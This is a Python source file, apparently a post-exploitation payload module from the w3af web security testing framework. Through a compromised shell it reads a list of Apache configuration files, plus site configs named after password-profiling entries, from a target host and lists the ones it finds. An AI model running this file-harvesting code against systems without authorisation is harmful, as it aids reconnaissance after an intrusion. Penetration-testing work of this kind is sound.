import core.data.kb.knowledgeBase as kb
import plugins.attack.payloads.misc.file_crawler as file_crawler
from plugins.attack.payloads.base_payload import base_payload
from core.ui.consoleUi.tables import table


class apache_config_files(base_payload):
    '''
    This payload finds readable Apache configuration files
    '''
    def api_read(self):
        result = {}
        result['apache_config'] = {}
        files = []

        files.append('apache2.conf')
        files.append('httpd.conf')
        files.append('magic')
        files.append('envvars')
        files.append('ports.conf')
        files.append('conf.d/security')
        files.append('sites-available/default')
        files.append('sites-available/default-ssl')
        files.append('conf.d/subversion.conf')
        files.append('workers.properties')

        apache_dir = self.exec_payload('apache_config_directory')['apache_directory']
        if apache_dir:
            for dir in apache_dir:
                for file in files:
                    content = self.shell.read(dir+file)
                    if content:
                        result['apache_config'][ dir+file ] = content
                
                #TODO: Add target domain name being scanned by w3af.
                if kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                    for profile in kb.kb.getData('passwordProfiling', 'passwordProfiling'):
                        profile_content = self.shell.read(dir+'sites-available/'+profile.lower())
                        if profile_content:
                            result['apache_config'][ dir+'sites-available/'+profile.lower() ] = profile_content

        return result
        
    def run_read(self):
        api_result = self.api_read()
        
        if not api_result['apache_config']:
            return 'Apache configuration files not found.'
        else:
            rows = []
            rows.append( ['Apache configuration files'] ) 
            rows.append( [] )
            for key_name in api_result:
                for filename, file_content in api_result[key_name].items():
                    rows.append( [filename,] )
            result_table = table( rows )
            result_table.draw( 80 )                    
            return

